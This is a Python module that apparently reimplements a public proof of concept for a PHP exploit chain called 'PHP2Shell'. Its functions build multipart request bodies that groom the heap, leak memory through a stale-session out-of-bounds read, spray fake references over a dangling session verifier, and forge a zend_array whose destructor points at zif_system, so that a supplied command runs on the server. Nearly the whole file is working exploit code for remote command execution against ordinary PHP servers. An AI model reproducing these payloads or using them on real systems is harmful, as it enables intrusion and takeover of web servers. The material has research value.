"""Byte-exact request bodies for the PHP2Shell mod_php chain.

The bodies are reimplementations of the payload shapes documented in the
public research PoC (9bie/php2shell-bypass-aslr-exp, pinned 17e98ee8).
The heap layout is allocation-sensitive, so these builders deliberately
preserve every wire-level detail.
"""
from __future__ import annotations

import struct

BOUNDARY = b"C" * 10
QUERY = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"

# 14 full-chunk fills, one 400-page fill that leaves a 111-page hole,
# one full-chunk fill, then 900 nested arrays to occupy the hole.
LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])


def _multipart_part(
    name: bytes,
    value: bytes = b"",
    filename: bytes | None = None,
    ctype: bytes | None = None,
) -> bytes:
    out = bytearray(b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
    if filename is not None:
        out += b"; filename=\"" + filename + b"\""
    out += b"\r\n"
    if ctype is not None:
        out += b"Content-Type: " + ctype + b"\r\n"
    out += b"\r\n" + value + b"\r\n"
    return bytes(out)


def _empty_file_part(name: bytes, ctype: bytes, filename: bytes = b"") -> bytes:
    # Empty body: the next boundary follows the blank line directly.
    return (
        b"--" + BOUNDARY
        + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\""
        + b"; filename=\"" + filename + b"\""
        + b"\r\nContent-Type: " + ctype
        + b"\r\n\r\n"
    )


def _nest_name(i: int, depth: int, key_pad: int) -> bytes:
    return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)


def build_a1(
    parts: int = 860,
    depth: int = 64,
    key_pad: int = 90,
    fillers128: int = 14,
    big: int = 78,
    big_len: int = 8000,
    burners: int = 20,
    burner_len: int = 4000,
    progress_len: int = 4000,
    sid_hex: str = "00",
) -> bytes:
    """END-cleanup send_cookie OOM body (A1)."""
    out = bytearray()
    out += _multipart_part(b"PHPSESSID", bytes.fromhex(sid_hex))
    for i in range(parts):
        if i == 0:
            ctype = b"C" * 103
            filename = b"A"
        elif i == 1:
            ctype = b"C" * 231
            filename = b"A"
        else:
            ctype = b"application/octet-stream"
            filename = b""
        out += _empty_file_part(_nest_name(i, depth, key_pad), ctype, filename)
    for i in range(fillers128):
        out += _multipart_part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(big):
        out += _multipart_part(("b%04d" % i).encode(), b"B" * big_len)
    for i in range(burners):
        out += _multipart_part(("u%02d" % i).encode(), b"U" * burner_len)
    out += _multipart_part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def _tag8(idx: int, tagged: bool) -> bytes:
    if tagged:
        return b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB"
    return b"BBBB/BBB"


def _forge_fill_value(pages: int, page: int, fake_len: int, idx: int, tagged: bool) -> bytes:
    length = pages * 4096 - 25
    value = bytearray(b"A" * length)
    header = page * 0x1000 - 0x1018
    if 0 <= header and header + 0x18 + 8 <= length:
        struct.pack_into("<I", value, header + 0x00, 0)
        struct.pack_into("<I", value, header + 0x04, 0x16)
        struct.pack_into("<Q", value, header + 0x08, 0)
        struct.pack_into("<Q", value, header + 0x10, fake_len)
        value[header + 0x18:header + 0x18 + 8] = _tag8(idx, tagged)
    return bytes(value)


def _forge_value(page: int, fake_len: int, idx: int, tagged: bool) -> bytes:
    header = page * 0x1000 - 0x1018
    length = header + 0x18 + 8
    value = bytearray(b"A" * length)
    struct.pack_into("<I", value, header + 0x00, 0)
    struct.pack_into("<I", value, header + 0x04, 0x16)
    struct.pack_into("<Q", value, header + 0x08, 0)
    struct.pack_into("<Q", value, header + 0x10, fake_len)
    value[header + 0x18:header + 0x18 + 8] = _tag8(idx, tagged)[:8]
    return bytes(value)


def _value_pages(pages: int, fill: bytes) -> bytes:
    return fill * (pages * 4096 - 25)


def build_b1(
    spec: str = LEAK_SPEC,
    sid: bytes = b"a",
    progress: bytes = b"k0",
    name_len: int = 120,
    fake_len: int = 0xC8000,
    tagged: bool = True,
) -> bytes:
    """Stale-id OOB read body (B1)."""
    out = bytearray()
    out += _multipart_part(b"PHPSESSID", sid)
    items = spec.replace(",", " ").split()
    if not any(item.partition(":")[0] == "P" for item in items):
        out += _multipart_part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)

    idx = 0
    for item in items:
        kind, _, arg = item.partition(":")
        if kind in ("F", "S"):
            value = _value_pages(int(arg, 0), b"A" if kind == "F" else b"S")
        elif kind == "A":
            value = _forge_value(int(arg, 0), fake_len, idx, tagged)
        elif kind == "X":
            for _ in range(int(arg, 0)):
                name = ("x%05d" % idx).encode() + b"[a]" * 12
                out += _multipart_part(name, b"v")
                idx += 1
            continue
        elif kind == "G":
            pages_s, _, page_s = arg.partition(":")
            value = _forge_fill_value(int(pages_s, 0), int(page_s, 0), fake_len, idx, tagged)
        else:
            raise ValueError("bad leak spec item %r" % item)
        name = (b"f%04d" % idx).ljust(name_len, b"f")[:name_len]
        out += _multipart_part(name, value)
        idx += 1

    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def build_a2(
    parts: int = 880,
    depth: int = 64,
    fillers: int = 115,
    sid: bytes = b"a" * 32,
    progress: bytes = b"k0",
) -> bytes:
    """Cheap-OOM body that leaves the session globals dangling (A2)."""
    out = bytearray()
    out += _multipart_part(b"PHPSESSID", sid)
    out += _multipart_part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    for i in range(fillers):
        out += _multipart_part(("%03d" % i).encode(), b"x")
    for i in range(parts):
        out += _empty_file_part(_nest_name(i, depth, 0), b"application/octet-stream", b"")
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def build_ht(s_addr: int, zif_addr: int, command: bytes, size: int = 384) -> bytes:
    """Fake zend_array whose pDestructor is zif_system."""
    ht = bytearray(b"\x00" * size)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, s_addr + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif_addr)
    e = 0x20
    struct.pack_into("<Q", ht, e + 0x00, 0)
    struct.pack_into("<Q", ht, e + 0x08, 0)
    struct.pack_into("<Q", ht, e + 0x10, zif_addr)
    struct.pack_into("<Q", ht, e + 0x18, 0)
    struct.pack_into("<Q", ht, e + 0x20, 0)
    struct.pack_into("<I", ht, e + 0x28, 0)
    struct.pack_into("<I", ht, e + 0x2C, 1)
    struct.pack_into("<Q", ht, e + 0x30, 0)
    struct.pack_into("<Q", ht, e + 0x38, 0)
    struct.pack_into("<I", ht, e + 0x40, 0)
    struct.pack_into("<Q", ht, e + 0x50, s_addr + 0x80)
    struct.pack_into("<I", ht, e + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(command))
    ht[0x98:0x98 + len(command)] = command
    ht[0x98 + len(command)] = 0
    return bytes(ht)


def _fake_ref(ptr: int, rc: int, val_type: int) -> bytes:
    raw = bytearray(32)
    struct.pack_into("<I", raw, 0, rc)
    raw[4] = 0x0A
    struct.pack_into("<Q", raw, 8, ptr)
    struct.pack_into("<I", raw, 16, val_type)
    return bytes(raw)


def _spray(vl: int, ptr: int, rc: int, val_type: int, ref_start: int = 8, ref_step: int = 32) -> bytes:
    value = bytearray(b"S" * vl)
    offset = ref_start
    while offset + 32 <= vl:
        value[offset:offset + 32] = _fake_ref(ptr, rc, val_type)
        offset += ref_step
    return bytes(value)


def _name(prefix: bytes, i: int, nlen: int) -> bytes:
    raw = prefix + ("%09d" % i).encode()
    return (raw + b"x" * nlen)[:nlen]


def build_b2(
    s_addr: int,
    ht: bytes,
    vl: int = 384,
    n1: int = 500,
    n2: int = 495,
    rc: int = 1,
    name_len: int = 10,
    sid: bytes = b"a" * 32,
    progress: bytes = b"k0",
    val_type: int = 0x0107,
) -> bytes:
    """Fake-reference spray that overwrites the dangling session verifier (B2)."""
    spray = _spray(vl, s_addr, rc, val_type)
    out = bytearray()
    for i in range(n1):
        out += _multipart_part(_name(b"s", i, name_len), spray)
    out += _multipart_part(b"ht", ht)
    out += _multipart_part(b"PHPSESSID", sid)
    out += _multipart_part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    for i in range(n2):
        out += _multipart_part(_name(b"t", i, name_len), spray)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)
